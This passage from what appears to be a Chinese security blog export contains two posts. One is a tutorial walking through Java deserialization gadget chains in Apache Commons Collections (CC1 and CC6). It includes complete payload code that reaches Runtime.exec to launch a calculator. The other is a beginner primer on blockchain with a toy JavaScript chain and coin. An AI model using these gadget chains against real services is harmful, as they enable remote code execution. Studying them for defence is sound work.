\"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n            }\n        }\n    }\n\n```\n\n首先第一个if判断memberType是否为空，memberType是构造函数传入进来的Annotation的成员变量，name是从构造函数传入的map遍历时获取的key，上面代码的注释中提到了如果要绕过这层if，我们传入的map的key中就必须要有传入的Annotation的变量值，但Override内部没有值，所以我们用Target，并且将其中的value属性存入到map中去\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242007067.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242007067.png)\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242012006.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242012006.png)\n\n```java\nmap.put(\"value\",\"v\");\nObject o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n\n```\n\n我们再看第二层if，memberType是一个Annotation，而value是一个V（键值对中的Value类），所以这里直接返回false，通过第二层if：\n\n```java\nObject value = memberValue.getValue();\nif (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy )) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n\n```\n\n剩下的最后一个问题，现在setValue中传入的不是我们想要的，这时我们需要另外一个Transformer，`ConstantTransformer`，\n\n它的transform方法不论接收什么对象，都可以原封不动的输出一个我们可控的值：\n\n```java\n    public ConstantTransformer(Object constantToReturn) {\n        super();\n        iConstant = constantToReturn;\n    }\n    public Object transform(Object input) {\n        return iConstant;\n    }\n\n```\n\n所以最终payload修改为：\n\n```java\npublic class CC1Test {\n    public static void main(String[] args) throws Exception {\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        });\n//        chainedTransformer.transform(Runtime.class);\n//        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        map.put(\"value\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n\n//        Method getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);\n//        Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n    }\n    public static void serialize(Object obj) throws IOException\n    {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException\n    {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));\n        Object obj = ois.readObject();\n        return obj;\n\n    }\n}\n\n```\n\n我们把链子倒着推了一遍，在进行反序列化的时候是从我们编写payload的最后开始触发的，也就是`AnnotationInvocationHandler`的readObject方法，如果还有不懂的地方可以下断点调试一下。\n\n# 第二条链子：\n\n我们在第一条链子中找InvokerTransformer.transform的下一调用时当时找到了两个Map，但后来我们将三个InvokerTransfomer封装进了一个ChainedTransformer中，所以其实在ChainedTransformer的trnasform中调用的还是InvokerTransformer的transform方法，因此找InvokerTransformer.transform和找ChainedTransformer.transform的后续用法是一样的,第一条链中利用的是TransformedMap，还有另外一个LazyMap，其中的get方法调用了transform，我们在这里跟下去：\n\n```java\npublic ChainedTransformer(Transformer[] transformers) {\n    super();\n    iTransformers = transformers;\n}\n\npublic Object transform(Object object) {\n        for (int i = 0; i < iTransformers.length; i++) {\n            object = iTransformers[i].transform(object);\n        }\n        return object;\n    }\n```\n\n![image-20230206143114129](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143114129.png)\n\n看一下LazyMap，get方法中存在factory.transform，factory构造函数可控，所以我们要做的就是将factory传值为ChainedTransformer，并且进入if判断，map中没有key才会触发transform:\n\n```java\nprotected LazyMap(Map map, Transformer factory) {\n    super(map);\n    if (factory == null) {\n        throw new IllegalArgumentException(\"Factory must not be null\");\n    }\n    this.factory = factory;\n}\n\npublic Object get(Object key) {\n        // create value for key if key is not currently in the map\n        if (map.containsKey(key) == false) {\n            Object value = factory.transform(key);\n            map.put(key, value);\n            return value;\n        }\n        return map.get(key);\n    }\n```\n\n我们接着找谁调用了get，findusages结果六千多条我就不找了，最终是锁定在了`AnnotationInvocationHandler.invoke`上，memberValues是构造函数传入的一个Map：\n\n```java\nObject result = memberValues.get(membjieker);\n```\n\n```java\nAnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues)\n```\n\n由于`AnnotationInvocationHandler`是一个[动态代理调用处理器类](https://blog.csdn.net/Justin_bibo/article/details/114888702)，当在动态代理中调用`AnnotationInvocationHandler`的方法时就会自动调用invoke，这里给出的是`AnnotationInvocationHandler.readObject`，可以说是很巧了，通过自己调用自己，其实用其他的类也是可以的，也算是一个比较有趣的点，我们来看调用过程：\n\n![image-20230206143014958](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143014958.png)\n\n先看invoke：\n\n```java\nif (member.equals(\"equals\") && paramTypes.length == 1 &&\n    paramTypes[0] == Object.class)\n    return equalsImpl(args[0]);\nif (paramTypes.length != 0)\n    throw new AssertionError(\"Too many parameters for an annotation method\");\n\n Object result = memberValues.get(member);\n```\n\n想要执行get方法我们要保证前面的两个if不能执行，首先方法名不能为equals，并且要是一个无参方法，在readObject中恰好调用了memberValues的entrySet方法：\n\n```java\nfor (Map.Entry<String, Object> memberValue : memberValues.entrySet())\n```\n\n我们正向梳理一下流程：\n\n- 共需要两个AnnotationInvocationHandler，第一个AIH中memberValues为Proxy（代理了第二个AnnotationInvocationHandler的动态代理），这样通过调用Proxy.entrySet来触发Proxy的invoke，Proxy中AIH的memberValues为LazyMap，在Proxy的invoke中调用了LazyMap.get，触发ChainedTransformer.transform，剩下的触发点就和之前的第一条链一样了。\n\n**开始搓payload：**\n\n由于前面的Transformer部分都一样，所以我直接把在CC1中生成ChainedTrnasformer封装到了一个类的静态方法中，这样在之后的链子中如果用到了ChainedTransformer直接调用这个方法即可：\n\n![image-20230206143045565](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143045565.png)\n\nLazyMap有两个decorate方法和两个构造函数，我们要用的是接收map和Transformer的decorate和构造函数：\n\n```java\npublic static Map decorate(Map map, Transformer factory) {\n    return new LazyMap(map, factory);\n}\n\nprotected LazyMap(Map map, Transformer factory) {\n        super(map);\n        if (factory == null) {\n            throw new IllegalArgumentException(\"Factory must not be null\");\n        }\n        this.factory = factory;\n    }\n```\n\npaylaod：\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazymap = LazyMap.decorate(map,ctf);\n```\n\n动态代理：\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazymap = LazyMap.decorate(map,ctf);\n\nClass AIH = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor AIHC = AIH.getDeclaredConstructor(Class.class,Map.class);\nAIHC.setAccessible(true);\nInvocationHandler AIHCIH = (InvocationHandler) AIHC.newInstance(Override.class,lazymap);\n\nMap mapProxy = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),new Class[]{Map.class},AIHCIH);\nObject o = AIHC.newInstance(Override.class,mapProxy);\nserialize(o);\nunserialize(\"ser.bin\");\n```\n\n我们在实例化InvocationHandler时传入的第一个注解参数不需要再是`Target`，因为我们已经不再需要readObject中的`setValue`，而是直接在遍历map时利用`memberValues.entrySet()`。\n\nCC1的两条利用链:\n\n![image-20230206143129393](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143129393.png)\n\n# CommonsCollections6\n\n在jdk8u71中对CommonsCollections1做出了修复，主要是在`AnnotationInvocationHandler.readObject`中做出了修改，针对`checkSetValue`链中，readObject中整个移除了对`checkSetValue`的操作，针对`LazyMap`链则将`memberValues`设置为了客户端不可控，而是通过一个Filed类来进行读取。我们在实际进行反序列化的攻击时，如果使用CC1来攻击时，一旦jdk版本更改原有的gadgetchain就无法使用，这样对我们的攻击进行了极大的受限，那么有没有一个受jdk版本影响对的gadgetchain呢，我们来看CC6。\n\nysoserial中给出的gadgetchain，可以看到链子后半截直到`LazyMap.get()`和我们CC1的LazyMap链是一样的： \n\n![image-20230206143314008](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143314008.png)\n\n再往上看我们发现触发点是`HashMap.hash`，这里和[URLDNS](https://www.notion.so/URLDNS-8a6e81f093e146879b842c75ce902273)中非常像了，通过向`HashMap`put一个键值对，那么在HashMap的readobject中就会对Map的键值对进行遍历，并且对每一个键值对的key进行hash，在进行hash时会对key进行hashCode。\n\n![image-20230206143245908](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143245908.png)\n\n根据上面ysoserial给出的gadgetchain，我们发现所需要调用的hashCode的类就是`TiedMapEntry`，gadgetchain补充完之后就是这样了：\n\n![image-20230206143301864](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143301864.png)\n\n我们来看这个TiedMapEntry，它的构造函数接收一个Map和一个key，也就是说这个类储存的键值对格式是 Map-key，（注意这里key只是一个名字，我们通常说的key-value一般来说是key在前，value在后，但key是否在前是不一定的，HashMap中以Key-value格式储存键值对，那么对于HashMap来说在前面的就是key，而TiedMapEntry以Map-key形式储存键值对，那么对它来说key就在后面）我们将lazymap扔到TiedMapEntry中：\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazyMap = LazyMap.decorate(map,ctf);\n\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\n```\n\n再将`tiedMapEntry`作为键值储存到HashMap中：\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazyMap = LazyMap.decorate(map,ctf);\n\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\nHashMap<Object,Object> hashMap = new HashMap<>();\nhashMap.put(tiedMapEntry,\"123\");\nserialize(hashMap);\n```\n\n但是这里依然有一个问题，如果运行一下上面的代码会发现我没有进行反序列化也弹出了计算器，这个问题我们在URLDNS中就遇到过，当序列化时，在我们put`tiedMapEntry`时就已经触发了hashCode，计算器就会弹出，并不是通过反序列化来触发的，所以我们要加一段代码防止在put时就弹计算器，我这里是在decorate时，传一个无效的Transformer，put时就不会弹计算器，在序列化前将factor通过反射修改回去，反序列化的结果就不会受到影响：\n\n```java\n        ChainedTransformer ctf = getChain.getChainedTransformer();\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\n        HashMap<Object,Object> hashMap = new HashMap<>();\n        hashMap.put(tiedMapEntry,\"123\");\n        lazyMap.remove(\"123\");\n\n        Class c = LazyMap.class;\n        Field factoryField = c.getDeclaredField(\"factory\");\n        factoryField.setAccessible(true);\n        factoryField.set(lazyMap,ctf);\n//      serialize(hashMap);\n\t\t\t\tunserialize(\"ser.bin\");\n```\n","tags":["Java反序列化"],"categories":["WebSec"]},{"title":"区块链安全前置扫盲","url":"/2023/04/24/区块链安全前置扫盲/","content":"\n# web3.0安闻全知\n\n> 参考链接\n> \n\n[去中心化应用程序 Dapp 是什么？与 APP 有哪些区别？](https://www.playbtc.cn/rumen/52380.html)\n\n[https://www.youtube.com/watch?v=YdWP-wJh9jA](https://www.youtube.com/watch?v=YdWP-wJh9jA)\n\n## 互联网发展的三个阶段\n\n### web1.0\n\n静态页面，内容只能供用户去阅读，类似于在网络上读报纸或者看书。\n\n### web2.0\n\n动态互联网，实现用户之间的互动，比如twitter，facebook，titok等。\n\nweb2.0中厂商用免费或极低的成本吸引用户，通过获取到用户的信息来推流广告从而获得利润。\n\n打个比方就是 厂商在一片地上种了很多草，吸引羊来吃，趁着羊吃草的功夫把羊身上的毛薅下来拿去卖钱，而羊自己并不在意这些毛，可以说是一种双向互利的方式。\n\n### web3.0\n\nweb3.0是一个很模糊的概念，随着区块链技术的发展，基于区块链的web3.0诞生。\n\n接着用上面的例子来说，随着web2.0的发展壮大，稀缺的不再是草，而是羊毛，也就是用户身上的数据。那么羊毛的重要性愈加突出，所以提出web3.0的概念，也就是拥有自己的一片空间，别人无论如何都无法修改，也就是将羊毛（数据）存放在了一个非常安全的地方中，相比于web2.0，不但实现了动态的交互，也实现了数据的“拥有”。\n\nweb3的概念非常模糊，可以说是一个大方向，按照我个人的理解可以说是在互联网创造了一个虚拟的世界，这个虚拟的世界拥有和现实世界一样的货币交易系统以及其他体系，能够自主维持运转的这样一个“虚拟生态系统”，而这个生态系统的生存法则就是“去中心化”。\n\n**什么是去中心化？**\n\n比如现在市面上的app都由一个厂家负责，厂商可以随意删除控制用户数据，形成了以厂商为中心的服务体系，去中心化就是没有中心厂商作为核心，而是所有用户形成一个能够自力更生的体系。\n\n## 密码货币\n\n随着web2.0发展，数字货币使用越来越多，而在区块链技术的支持下，数字货币也出现了全新的存在形式，去中心化的密码货币，世界上第一种密码货币就是比特币。像纸币有防伪印一样，密码货币通过密码学的散列计算出的hash值并且和智能合约进行绑定，密码货币基于去中心化的机制，与依赖中心监管体系的银行金融系统相对。之后出现的数种密码货币被创造，它们通常被称为altcoins。\n\n## 区块链\n\n[程序员来讲讲什么是区块链 | 小白也能听懂的通俗解释 | 区块链原理 | 比特币 | 数字货币_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV14E411v7eS/?spm_id_from=333.337.search-card.all.click)\n\n**区块链的防篡改机制**\n一个区块中储存了三样东西：数据，前一个区块的hash值，自身的hash值（由数据和前一区块的哈希值共同决定），如果要更改某一区块的内容，那么该区块（a区块）的hash值就会改变，下一区块（b区块）储存的a区块的hash值无法对应a区块当前哈希值，那么这两个区块间的链接就会断开。\n\n如果想要篡改某一区块的数据，我们就要将这一区块以及后续所有区块的hash值进行重算，比如一条区块链里面有abcde五个区块，当我们篡改了b区块的数据，那么我们就要带着b区块的新hash值和c区块的数据重新计算出c区块的新hash值，然后再带着c区块的新hash值和d区块的数据重新计算d区块的新hash值，再带着d区块的新hash值和e区块的数据重新计算e区块的hash值…………………..其实在重新计算某一区块的hash值的过程也就相当于创造了一个新的区块，因此篡改一个区块以及后续区块所需的时间取决于创造一个区块所需要的时间。\n\n这个看起来对算力要求似乎非常庞大，但是现代计算机其实是可以做到这一点的，如果我们有一台超大算力的计算机，那么是不是轻松就可以改变区块链的内容了？为了防止这种情况的出现，区块链加入了工作量证明机制（proof of work）简称 pow\n\n我们用游戏举例说明一下pow，我们刚才说到用超大算力计算机来篡改区块链，这就好比你拿着满级神装在新手村乱杀，区块链是不允许这种情况出现的，因此它会上调怪物属性，也就是会增加创造一个区块所需的难度，使每一新区块被创造时都保持在十分钟左右（当然这个时间是可以更改的），因此即使是一台超高算力的计算机想要篡改一个区块所需的时间仍然是是 \n\n`创造一个区块的时间✖️n min`。\n\n那我们所说的挖矿是什么呢？上面提到的情况是想要篡改区块中的数据，那么我没有恶意，我只是单纯的创造区块去给自己或者他人使用，这个创造区块的过程牺牲了我电脑的算力和一些其他资源，所以作为补偿，创建区块的人会得到密码货币的奖励，这就是我们所说的挖矿。\n\n**区块链的点对点网络结构**\n\n在传统的web服务中，传统的链接对象基本都是客户端和服务端，众多客户端访问一个服务端来进行交互，而在区块链的点对点网络结构（peer to peer）中，不再有客户端与服务端的概念，每一个节点间相互平等，并且包含完整的区块链数据存储，也就是说每一个节点中都储存了整个区块链网络中的所有信息，这样即使一个节点出现故障，其他所有节点也在帮他记录信息，这些记录了所有节点区块链的节点叫做全节点，当然也有只储存了自己信息的轻节点，比如区块链用来储存转账记录，那么每一节点都储存了所有节点之间的转账记录，每一节点储存的内容也是相同的，如果某一节点与其他节点出现差异，那么该节点或许就有被篡改过的可能了，但是被篡改几乎是不可能发生的，原因看下面。\n\n点对点网络结构下的所有节点拥有判断区块是否被篡改的能力，当一个新区块想要加入某一节点的区块链时，该节点会向其他所有节点进行广播，所有的节点进行判断，如果50%以上的节点都认为该区块没有被篡改，那么这个区块就可以成功的加入区块链当中，反言之如果想要篡改某一区块的数据，你首先要将这一区块后的所有哈希重新计算，并且还要更改超过百分之五十节点的这一区块后的所有区块的哈希，那么就要拥有超过全网50%以上的算力才可以，这付出的代价是相当高的，这就是区块链网络系统的少数服从多数原则。\n\n## DAPP\n\n### **Dapp 是什么？**\n\nAPP (Application) 指的是手机里的应用程序，像是微信、微博、抖音…等都是日常生活中常会使用到的 App。\n\n而 Dapp 的全名为去中心化应用程序（Decentralized Application），是建立在区块链系统网络上，所提供的服务都具有公开透明、不可篡改的特性。\n\n以下是 Dapp 所具有的要素：\n\n- 代码开源：程序代码皆公开透明，任何人都可以查阅及审核，避免项目方说到没做到。\n- 分布式帐本：降低数据遗失的风险，且没有任何其他第三方有权能够窜改数据。\n- 数据所有权：除本人（私钥持有者）外，任何人皆无法动用该帐号的数据。\n\n### **为什么 Dapp 会崛起?**\n\n事实上，App 都是中心化的应用服务，用户所使用的数据都会存储在单一服务器系统里，代表公司能掌控用户的所有数据，但相关问题也随之浮出水面。\n\n### **数据所有权归属问题**\n\n用户在 App 上的个人资料、搜索浏览纪录等信息都会存储在中心化系统的服务器里，这也意味着软件公司能够借由这些数据来营利。\n\n也导致像是微博、抖音等企业，能透过搜集的用户数据来投放广告，并借此获利。等于企业能用你的信息来赚钱，但你却分不到任何好处，甚至还可能受到影响（例如被疯狂投放广告、或个人资料被平台外泄）。\n\n另外，传统手游的游戏道具、帐号数据也都属于公司所有，一旦宣布停止营运，这些资产也会随着官方服务器关闭而消失。\n\n但在 Dapp 中，你的游戏道具、帐号都会以 NFT 形式储存在链上，因此只要区块链不倒，你就能持续拥有这些资产。换句话说，Dapp 能够让数据的所有权回归到用户身上。额外提醒，虽然你仍拥有这些资产，但可能会因为游戏已经关闭，导致这些资产的现值趋近于零，你能保有的仍以回忆居多。\n\n### **过度中心化**\n\nApp 是由中心化服务器来进行管理，因此企业有时可以专断独行，但用户却没有任何反制的手段：例如可以随意植入广告，或是删除用户的内容、帐号。\n\n而 Dapp 的数据都存在区块链上，因此项目方没办法任意删除用户资料，目前也没有任何广告植入的问题（但不确定未来是否会有项目开始植入广告）。\n\n由于上述几点原因，也让许多人开始对传统的 App 感到不满，于是就有人打算通过区块链“去中心化”的特性来研发能解决上述问题的 App，于是 Dapp 就此诞生。\n\n不过同时也要注意，不是每个 Dapp 都一定符合公开、去中心化的规范，例如 Opensea 就能下架用户的 NFT 和限制用户登陆。\n\n### **Dapp 与 App 的差异**\n\nApp 的应用服务是使用中心化服务器，代表软件公司必须要承担存储用户的数据量的营运成本，否则将无法持续地运行。\n\n例如抖音服务器的成本就百万以上，因此必须想办法创造各种营收管道来支持各项支出，像是通过大数据将广告推广到潜在用户面前，借此吸引更多广告商进驻。\n\n而 Dapp 是建立在区块链上，用户在链上进行交易、换币等行为时，是需要自行负担手续费（Gas 费）的，也就代表开发商的运营成本会比传统 App 来得更低（不过有些开发商为了吸引用户，会帮用户负担使用时的手续费）。\n\n|  | Dapp | App |\n| --- | --- | --- |\n| 服务器 | 去中心化 | 中心化 |\n| 隐私性 | 有（区块链匿名性） | 无（还可能被外泄） |\n| 营运成本 | 用户共同负担（或开发商负担） | 开发商负担 |\n| 平台获利来源 | 智能合约（链上手续费） | 广告商或用户消费 |\n| 数据所有权 | 用户 | 开发商 |\n| 平台控制权 | 开发商或是 DAO 治理 | 开发商 |\n| 系统 | 区块链 | Android、iOS |\n| 代码是否开源 | 代码皆公开，可供人参考 | 代码为公司机密，擅用者可能会吃上官司 |\n\n## 智能合约\n\n智能合约，是一段写在区块链上的代码，一旦某个事件触发合约中的条款，代码即自动执行。也就是说，满足条件就执行，不需要人为操控，类似于传统web的后端代码。\n\n# 简单区块链实现\n\n我们用Javascript来手写一个建议的区块链出来，其实和写一个链表很像：\n\n```jsx\nconst sha256 = require('crypto-js/sha256')\nDate = new Date()\n\nclass block{\n    constructor(data,time,previousHash) {\n        this.data = data\n        this.time = time\n        this.previousHash = previousHash\n        this.myHash = this.currHash()\n    }\n    currHash() {\n        return sha256(this.data + this.time + this.previousHash).toString()\n    }\n}\n\nclass blockCahin{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()];\n    }\n    createBlockchain()\n    {\n        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)\n    }\n    getLatestblock()\n    {\n        return this.chain[this.chain.length - 1]\n    }\n    addBlock(newBlock)\n    {\n        newBlock.previousHash = this.getLatestblock().myHash\n        newBlock.myHash = newBlock.currHash()\n        this.chain.push(newBlock)\n    }\n}\n\nBlockChain = new blockCahin()\nBlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))\nconsole.log(BlockChain)\n```\n\n![image-20230206143941660](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143941660.png)\n\n接下来我们用代码实现一下简易的POW：\n\n```jsx\nconst sha256 = require(\"crypto-js/sha256\")\nfunction proofOfwork(){\n    let seed = \"y1zh3e7\"\n    let x = 1               // x为自增变量\n    while (true){\n        if(sha256(seed + x).toString().substring(0,4) != \"0000\") // 定义难度，比如我现在要求通过不断自增x去计算seed+x的哈希值\n        {                                                        // 当哈希值前四位都为0000时则代表成功 如果想提高难度我们就可以让前x位为xxxx\n            x += 1\n        }else{\n            console.log(sha256(seed + x).toString())\n            break\n        }\n    }\n    console.log(x)                                              // 输出计算多少次后成功\n}\n\nproofOfwork()\n```\n\n实现防篡改机制：\n\n```jsx\n/***********************************************\n验证区块链防篡改需要检测两项：                                    \n 1.重新计算区块的hash值，判断与区块中储存的hash是否相同 \n 2.判断当前区块的previousHash是否和上一区块的hash相同 \n ***********************************************/\nfunction validateBlock(validBlockchain){\n    if (validBlockchain.chain.length == 1)\n    {\n        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())\n        {\n            console.log(\"数据篡改\")\n            return false\n        }\n    }else {\n        for (let i=1; i<=validBlockchain.chain.length-1; i++)\n        {\n            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())\n            {\n                console.log(\"数据篡改\")\n                return false\n            }\n            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)\n            {\n                console.log(\"前后区块链断裂\")\n                return false\n            }\n        }\n    }\n    console.log(\"数据无篡改且区块链结构完整\")\n    return true\n}\n```\n\n将完整的POW整合到区块链当中并实现挖矿功能，最终实现的完整区块链：\n\n```jsx\nconst sha256 = require('crypto-js/sha256')\nDate = new Date()\n\nclass block{\n    constructor(data,time,previousHash) {\n        this.data = data\n        this.time = time\n        this.nonce = 1\n        this.previousHash = previousHash\n        this.myHash = this.calcHash()\n    }\n    calcHash() {\n        return sha256(this.data + this.time + this.previousHash + this.nonce).toString()\n    }\n    /**  **/\n    getAnswer(difficulty){\n        let answer = \"\"\n        for(let i=0; i<difficulty; i++)\n        {\n            answer += \"0\"\n        }\n        console.log(answer)\n        return answer\n    }\n   /** 引入挖矿功能 **/\n    mine(difficulty){\n        let answer = this.getAnswer(difficulty)\n        let Hash = this.calcHash()\n       while(true){\n            if (Hash.substring(0,difficulty) != answer)\n            {\n                this.nonce++\n                Hash = this.calcHash()\n            }else{\n                break\n            }\n       }\n       console.log(\"mine successful!\")\n       console.log(this.nonce)\n       return Hash\n    }\n}\n\nclass blockCahin{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()]\n        this.difficulty = 5\n    }\n    createBlockchain()\n    {\n        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)\n    }\n    getLatestblock()\n    {\n        return this.chain[this.chain.length - 1]\n    }\n    addBlock(newBlock)\n    {\n        newBlock.previousHash = this.getLatestblock().myHash\n        newBlock.myHash = newBlock.mine(this.difficulty)\n        this.chain.push(newBlock)\n    }\n}\n\n/***********************************************\n验证区块链防篡改需要检测两项：\n 1.重新计算区块的hash值，判断与区块中储存的hash是否相同\n 2.判断当前区块的previousHash是否和上一区块的hash相同\n ***********************************************/\nfunction validateBlock(validBlockchain){\n    if (validBlockchain.chain.length == 1)\n    {\n        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())\n        {\n            console.log(\"数据篡改\")\n            return false\n        }\n    }else {\n        for (let i=1; i<=validBlockchain.chain.length-1; i++)\n        {\n            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())\n            {\n                console.log(\"数据篡改\")\n                return false\n            }\n            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)\n            {\n                console.log(\"前后区块链断裂\")\n                return false\n            }\n        }\n    }\n    console.log(\"数据无篡改且区块链结构完整\")\n    return true\n}\n\nBlockChain = new blockCahin()\nBlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))\n// console.log(BlockChain)\n// BlockChain.chain[1].data = \"数据篡改\"\n// BlockChain.chain[0].myHash = \"0012343566688\"\n// console.log(validateBlock(BlockChain))\n```\n\n# 数字货币的简单实现\n\n## 比特币\n\n我们前面说到区块链是用来记录信息的，如果它记录的是转账记录那么它就成了一个账本。\n\n一笔转账信息需要以下四个信息：\n\n付款人 收款人 转账金额 转账时间\n\n我们前面提到了POW，比特币会通过POW将产生一个区块的时间控制在十分钟左右，比特币的工作机制基本如下：\n\n整个区块链是一个网状的网络结构，其中有一个中心，每十分钟发布一个问题（类似于我们之间生成的目标Hash），当问题发布后，该网状网络中的所有结点会来解这个问题（挖矿，爆破目标Hash值），此时就是各结点间的算力比拼，当有一个结点解出该问题后则代表挖矿成功，一个新区块被创造出来，这时该新区块内会自动生成一笔转账记录，其中的收款人就是该区块的挖出者，这时区块链就会自动把奖励发放到收款人的账户上，并且该区块会在整个区块链网络中进行广播，区块链中的每一个结点会对该区块进行验证其合法性，经过验证后该新区块就会被加到区块链上。每四年比特币的奖励会减半一次，最后的比特币总量大约是在2100万个左右。\n\n那么这里会有一个问题，如果过了几年之后，比特币越来越少，每次挖矿后几乎得不到比特币了，那还会有人来挖矿吗？\n\n其实比特币只是比特币区块链中的一个额外奖励机制，整个区块链货币依赖的是每一笔转账记录的手续费，当一个新区块被挖出时那么这个新区块的转账信息（我们刚才说到的比特币奖励机制）就会记录在这个新区块上（以转账的方式发放奖励货币），后续也会记录其他的转账信息，并且会产生手续费，手续费归记录该笔转账信息的区块的挖出者所有。\n\n说到动态调整难度，比特币是怎么调整的呢？\n\n比特币会在每2016个区块诞生后验证一下难度，如果说本来预期中mine这2016个区块所需要的时间是两个星期，而实际只用了一个星期，那么此时比特币区块链就会调整难度，使其达到预期，基本上比特币区块链会每两个星期调整一次难度。\n\n## 创建自己的数字货币\n\n首先我们要新建一个Transaction类来进行转账记录：\n\n```jsx\nclass Transaction{\n    constructor(from, to , amount) {\n        this.from = from\n        this.to = to\n        this.amount = amount\n    }\n}\n```\n\n更改区块中data的含义，此时要记录的是转账信息transaction，并且由于transaction是一个对象，因此在参与计算哈希时要转为字符串（这里将时间改为了Date.now，这样在区块创造时就记录了这笔转账记录的时间）：\n\n```jsx\nclass Block{\n    constructor(transaction,previousHash) {\n        this.transactions = transaction\n        this.time = Date.now()\n        this.nonce = 1\n        this.previousHash = previousHash\n        this.myHash = this.calcHash()\n    }\n    // 计算hash时要将data转换为字符串类型，此时的data是一个transaction\n    calcHash() {\n        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()\n    }\n```\n\n上面说到奖励货币的发放是通过转账的方式实现的，所以我们在链上实现逻辑：\n\n```jsx\nclass blockChain{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()]\n        this.difficulty = 5\n        this.transactionPool = []  //挖矿成功的转账信息\n        this.mineReward = 50       //每次挖矿成功的奖励货币数\n    }\nmineTransaction(minerAddress)\n    {\n        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)\n        this.transactionPool.push(minerRewardTransaction)\n    }\n```\n\n之前我们是在外部传入一个区块，在整个货币系统的实现后区块应该是在挖矿时在区块链内部产生的，修改代码：\n\n```jsx\n//将Transaction添加到Transaction Pool中\n    addTransaction(Transaction)\n    {\n        this.transactionPool.push(Transaction)\n    }\n\t\t\n\t\tmineTransaction(minerAddress)\n    {\n        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)\n        this.transactionPool.push(minerRewardTransaction)\n\n        //挖矿\n        /********************************************************\n         * 这里新区块记录了整个区块链的转账信息，但在实际情况中区块的存储\n         * 